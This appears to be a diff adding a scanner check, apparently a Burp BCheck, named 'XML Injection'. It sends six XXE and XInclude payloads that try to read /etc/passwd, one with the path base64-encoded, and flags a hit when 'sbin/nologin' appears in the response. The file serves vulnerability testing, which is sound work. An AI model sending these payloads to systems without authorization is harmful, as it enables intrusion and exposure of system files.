@@ -1,0 +1,37 @@
+metadata:
+    language: v1-beta
+    name: "XML Injection"
+    description: "XML INjection"
+    author: "Uday Datrak"
+    tags: "xss"
+
+
+given body insertion point then
+    send request:
+        replacing body: "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>"
+
+
+    send request:
+replacing body: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+
+
+  send request:
+replacing body: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>"
+
+send request:
+replacing body: "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>  <!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+
+
+send request:
+        replacing body: "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
+
+send request:
+        replacing body: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"> <xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+
+
+    if "sbin/nologin" in {latest.response} then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "XML INjection"
+    end if
